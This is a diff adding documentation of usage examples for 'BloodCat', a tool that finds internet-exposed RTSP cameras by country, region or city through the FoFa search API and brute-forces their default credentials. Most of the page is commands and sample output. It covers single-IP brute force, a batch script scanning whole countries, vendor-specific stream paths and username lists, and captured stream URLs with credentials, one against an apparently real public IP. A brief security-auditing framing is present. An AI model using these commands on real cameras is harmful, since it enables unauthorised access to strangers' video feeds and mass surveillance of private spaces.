@@ -1,0 +1,402 @@
+---
+title: 'Usage Examples'
+description: 'Real-world examples of using BloodCat for camera discovery and scanning'
+icon: 'code'
+---
+
+## Overview
+
+This page provides practical examples of using BloodCat for various scenarios, from scanning single cameras to discovering devices across entire regions.
+
+## Single IP Scanning
+
+Scan a specific RTSP camera when you already know the target IP and port.
+
+### Basic Single Target Scan
+
+```bash
+python3 bloodcat.py --ip "80.191.192.230:554"
+```
+
+**What happens:**
+
+<Steps>
+  <Step title="Connection Test">
+    BloodCat connects to the target and retrieves the RTSP banner to identify the camera vendor.
+    
+    ```
+    [+] Testing target: 80.191.192.230:554
+    [*] Authentication required detected, preparing to brute-force.
+    ```
+  </Step>
+  
+  <Step title="Vendor Detection">
+    The tool analyzes the RTSP banner to determine the camera manufacturer:
+    
+    ```
+    [+] Hikvision detected
+    ```
+    
+    Supported vendors include:
+    - Hikvision
+    - Dahua
+    - Uniview
+    - Axis
+    - Sony
+    - Vivotek
+    - Reolink
+    - TVT
+    - Milesight
+  </Step>
+  
+  <Step title="Credential Brute-Force">
+    BloodCat attempts common username/password combinations with vendor-specific RTSP paths:
+    
+    ```
+    Progress: 100%|████████████████████| 150/150 [00:45<00:00, 3.33combo/s]
+    ```
+  </Step>
+  
+  <Step title="Success & Save">
+    If credentials are found, the RTSP URL is displayed and saved:
+    
+    ```
+    [+] Successfully obtained RTSP URL
+    [!] RTSP URL: rtsp://admin:admin123@80.191.192.230:554/Streaming/Channels/101
+    ```
+  </Step>
+</Steps>
+
+### Custom Port Scanning
+
+```bash
+python3 bloodcat.py --ip "192.168.1.100:8554"
+```
+
+Scan a camera on a non-standard RTSP port (default is 554).
+
+### Local Network Scanning
+
+```bash
+python3 bloodcat.py --ip "10.0.0.50:554"
+```
+
+Scan cameras on your local network for security auditing.
+
+## Geographical Discovery
+
+Discover and scan RTSP cameras using FoFa integration with geographical filters.
+
+### Country-Wide Discovery
+
+Find all RTSP cameras in China:
+
+```bash
+python3 bloodcat.py --country CN --key "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+```
+
+**Expected output:**
+
+```
+[*] Fetching network cameras in CN  
+[+] Got data from Fofa...
+[+] Starting information retrieval
+[+] Testing target: 203.0.113.10:554
+[+] Dahua detected
+[*] Authentication required detected, preparing to brute-force.
+Progress: 100%|████████████████████| 120/120 [00:38<00:00, 3.15combo/s]
+[+] Successfully obtained RTSP URL
+[!] RTSP URL: rtsp://admin:password@203.0.113.10:554/cam/realmonitor?channel=1&subtype=0
+[+] Testing target: 203.0.113.25:554
+[+] Hikvision detected
+...
+```
+
+### Region-Specific Discovery
+
+Target cameras in Hong Kong:
+
+```bash
+python3 bloodcat.py --country CN --region HK --key "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+```
+
+This narrows the search to a specific region, reducing the number of targets.
+
+### City-Based Discovery
+
+Find cameras in a specific city:
+
+```bash
+python3 bloodcat.py --country US --city "Los Angeles" --key "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+```
+
+### Combined Geographical Filters
+
+Use multiple filters for precision:
+
+```bash
+python3 bloodcat.py --country CN --region "Beijing" --city "Chaoyang" --key "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+```
+
+<Info>
+  The FoFa query uses OR logic for region and city, so cameras matching either criterion will be included.
+</Info>
+
+## Advanced Examples
+
+### Multiple Country Codes
+
+Run separate commands for different countries:
+
+```bash
+python3 bloodcat.py --country US --key "your-key"
+python3 bloodcat.py --country GB --key "your-key"
+python3 bloodcat.py --country JP --key "your-key"
+```
+
+### Scripted Batch Scanning
+
+Create a shell script for automated scanning:
+
+```bash
+#!/bin/bash
+
+API_KEY="your-fofa-api-key"
+
+for COUNTRY in CN US GB DE FR JP; do
+    echo "Scanning country: $COUNTRY"
+    python3 bloodcat.py --country $COUNTRY --key $API_KEY
+    sleep 10  # Rate limiting
+done
+```
+
+### Targeted Research
+
+Scan specific regions for security research:
+
+```bash
+# European Union regions
+python3 bloodcat.py --country DE --region "Bavaria" --key "your-key"
+python3 bloodcat.py --country FR --region "Île-de-France" --key "your-key"
+
+# North American regions
+python3 bloodcat.py --country US --region "California" --key "your-key"
+python3 bloodcat.py --country US --region "Texas" --key "your-key"
+```
+
+## Output and Results
+
+### Console Output
+
+BloodCat provides real-time feedback during scanning:
+
+```
+                  ;,_            ,
+                 _uP~"b          d"u,
+               dP'   "b       ,d"  "o
+              d"    , `b     d"'    "b
+             l] [    " `l,  d"       lb
+...
+
+Blood Cat
+Maptnh@S-H4CK13                 https://github.com/MartinxMax
+
+[*] Fetching network cameras in CN HK 
+[+] Got data from Fofa...
+[+] Starting information retrieval
+[+] Testing target: 203.0.113.45:554
+[+] Hikvision detected
+[*] Authentication required detected, preparing to brute-force.
+Progress: 100%|████████████████████| 150/150 [00:45<00:00, 3.33combo/s]
+[+] Successfully obtained RTSP URL
+[!] RTSP URL: rtsp://admin:admin123@203.0.113.45:554/Streaming/Channels/101
+```
+
+### Saved Results
+
+All successful discoveries are saved to `./data/ipcam.info`:
+
+```bash
+cat ./data/ipcam.info
+```
+
+**Example content:**
+
+```
+rtsp://admin:admin123@203.0.113.45:554/Streaming/Channels/101
+rtsp://root:12345@203.0.113.67:554/cam/realmonitor?channel=1&subtype=0
+rtsp://admin:password@203.0.113.89:554/live.sdp
+rtsp://admin:123456@203.0.113.102:554/h264Preview_01_main
+```
+
+### Viewing Discovered Cameras
+
+Use the provided viewer script:
+
+```bash
+./play.sh
+```
+
+This launches a viewer interface to browse and watch discovered camera streams.
+
+## Understanding Scan Progress
+
+### Progress Bar Interpretation
+
+```
+Progress: 100%|████████████████████| 150/150 [00:45<00:00, 3.33combo/s]
+```
+
+- `150/150` - Tested 150 credential/path combinations
+- `[00:45<00:00]` - Took 45 seconds, 0 seconds remaining
+- `3.33combo/s` - Testing 3.33 combinations per second
+
+### Vendor-Specific Paths
+
+BloodCat uses vendor-specific paths for efficient scanning:
+
+<CodeGroup>
+
+```python Hikvision
+paths = [
+    'Streaming/Channels/101', 
+    'Streaming/Channels/102',  
+    'live.sdp',
+    'videoMain',
+    'media/video1',
+    'media/video2',
+]
+users = ['admin', 'root', 'supervisor']
+```
+
+```python Dahua
+paths = [
+    'cam/realmonitor?channel=1&subtype=0',   
+    'cam/realmonitor?channel=1&subtype=1',   
+    'live.sdp',
+    'videoMain',
+    'media/video1',
+    'media/video2',
+]
+users = ['root', 'system']
+```
+
+```python Uniview
+paths = [
+    'ucast/1/1',
+    'stream1',
+    'live.sdp',
+    'videoMain',
+    'media/video1',
+    'media/video2',
+]
+users = ['admin']
+```
+
+</CodeGroup>
+
+## Common Scenarios
+
+### Security Auditing
+
+Audit your organization's cameras:
+
+```bash
+# Scan your IP range (modify for actual usage)
+python3 bloodcat.py --ip "10.0.0.100:554"
+python3 bloodcat.py --ip "10.0.0.101:554"
+python3 bloodcat.py --ip "10.0.0.102:554"
+```
+
+### Penetration Testing
+
+Discover exposed cameras in target region:
+
+```bash
+python3 bloodcat.py --country US --region "California" --city "San Francisco" --key "your-key"
+```
+
+### Research and Analysis
+
+Gather data on camera exposure by geography:
+
+```bash
+# Collect regional statistics
+python3 bloodcat.py --country CN --key "your-key" > results_cn.log
+python3 bloodcat.py --country US --key "your-key" > results_us.log
+python3 bloodcat.py --country GB --key "your-key" > results_gb.log
+```
+
+## Tips for Effective Usage
+
+<CardGroup cols={2}>
+  <Card title="Start Small" icon="seedling">
+    Test with single IPs before running large geographical queries.
+  </Card>
+  
+  <Card title="Respect Rate Limits" icon="clock">
+    FoFa API has rate limits. Space out queries or use delays in scripts.
+  </Card>
+  
+  <Card title="Monitor Output" icon="eye">
+    Watch console output for errors or detection issues during scans.
+  </Card>
+  
+  <Card title="Verify Results" icon="check-double">
+    Always verify discovered URLs work before relying on them.
+  </Card>
+</CardGroup>
+
+## Troubleshooting
+
+### No Results Found
+
+```bash
+[!] Query error....
+```
+
+**Possible causes:**
+- Invalid FoFa API key
+- No cameras in specified region
+- API rate limit exceeded
+- Network connectivity issues
+
+**Solution:** Verify your API key and try a broader geographical filter.
+
+### Skip Messages
+
+```bash
+[+] Testing target: 203.0.113.50:554
+[...] Skip
+```
+
+**Cause:** Target is not responding on RTSP port or is unreachable.
+
+### No Successful Credentials
+
+```bash
+Progress: 100%|████████████████████| 150/150 [00:45<00:00, 3.33combo/s]
+[+] Testing target: 203.0.113.75:554
+```
+
+**Cause:** None of the common credentials worked. The camera may use non-default credentials.
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Command Reference" icon="book" href="/usage/command-reference">
+    Complete CLI argument documentation
+  </Card>
+  
+  <Card title="FoFa Integration" icon="globe" href="/usage/fofa-integration">
+    Deep dive into FoFa API usage
+  </Card>
+  
+  <Card title="Camera Detection" icon="camera" href="/cameras/detection">
+    Understand how brand detection works
+  </Card>
+  
+  <Card title="Viewer" icon="play" href="/reference/viewer">
+    Learn to use the stream viewer
+  </Card>
+</CardGroup>
